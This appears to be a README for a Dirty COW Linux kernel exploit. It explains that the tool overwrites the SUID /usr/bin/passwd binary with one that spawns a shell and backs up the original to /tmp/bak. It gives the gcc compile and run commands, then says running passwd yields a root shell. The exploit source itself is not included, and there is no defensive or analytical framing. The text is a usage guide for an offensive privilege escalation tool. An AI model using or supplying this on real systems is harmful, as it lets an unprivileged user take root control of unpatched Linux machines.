# dirtycow
***
Dirtcow replaces the SUID binary file located at /usr/bin/passwd with a modified version that launches a shell. As a precaution, a backup of the original /usr/bin/passwd file is stored in /tmp/bak.

- Compile and execute
```sh
gcc -pthread /path/to/dirtycow.c -o dirtycow
./dirtycow
```

- After the exploit finishes, execute the "passwd" binary to obtain a root shell.
```sh
/usr/bin/passwd
```
